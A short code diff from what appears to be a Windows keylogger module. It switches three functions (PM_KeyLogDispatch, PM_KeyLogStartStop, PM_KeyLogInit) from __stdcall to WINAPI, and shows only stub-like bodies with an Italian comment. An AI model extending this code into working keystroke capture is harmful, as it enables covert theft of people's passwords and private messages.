@@ -655,7 +655,7 @@ void ParseKey(DWORD message, DWORD lParam, DWORD wParam )
 }
 
 
-DWORD __stdcall PM_KeyLogDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
+DWORD WINAPI PM_KeyLogDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
 {
 	KEY_PARAMS *key_params;
 	key_params = (KEY_PARAMS *)msg;
@@ -664,7 +664,7 @@ DWORD __stdcall PM_KeyLogDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIM
 }
 
 
-DWORD __stdcall PM_KeyLogStartStop(BOOL bStartFlag, BOOL bReset)
+DWORD WINAPI PM_KeyLogStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	
 	// Lo fa per prima cosa, anche se e' gia' in quello stato
@@ -706,7 +706,7 @@ DWORD __stdcall PM_KeyLogStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_KeyLogInit(JSONObject elem)
+DWORD WINAPI PM_KeyLogInit(JSONObject elem)
 {
 	memset(kbuf, 0, sizeof(kbuf));
 	return 1;
